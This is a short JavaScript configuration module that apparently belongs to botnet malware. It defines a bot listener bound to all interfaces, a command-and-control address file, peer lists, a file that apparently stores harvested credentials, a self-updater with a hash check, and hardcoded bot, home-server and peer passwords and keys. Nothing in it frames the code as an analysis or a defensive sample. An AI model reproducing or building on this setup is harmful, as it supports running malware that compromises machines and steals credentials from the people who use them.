'use strict';
let config = {
  botListener: {
    port: 43134,
    host: '0.0.0.0'
  },
  win: {
    pathes: {
      homeAddr: '../cc.txt',
      id: '../id.txt',
      botPass: '../bp.txt',
      peers: '../peers.txt'
    }
  },

  homeAddr: null,
  listenPort: 43135,
  pass: '3eEjNSp6nWDyQglqXafC',
  modulesPath: 'modules',
  updater: {
    dir: 'upd',
    scriptName: 'upd.js',
    versionName: 'updv.txt'
  },
  timeout: 15 * 60 * 1000,       // milliseconds. 15 minutes
  key: 'mGwYSgqjKjTmDVXGZFqp',
  errFile: 'err1.log',
  peersFile: '../olst.txt',
  homeFile: '../cc.txt',
  credsFile: '../cr.txt',
  onUpdateHash: 'fcdec4de783de236f98d0c8a3ddbfdc150bcb830f750626f848b97891dc1b577',
  homePass: 'D1wqNCrVnikqM9L3kTDY',
  closedPeerPass: 'oTxcxI1oJHYqIlvS2a0f'
};

module.exports = config;
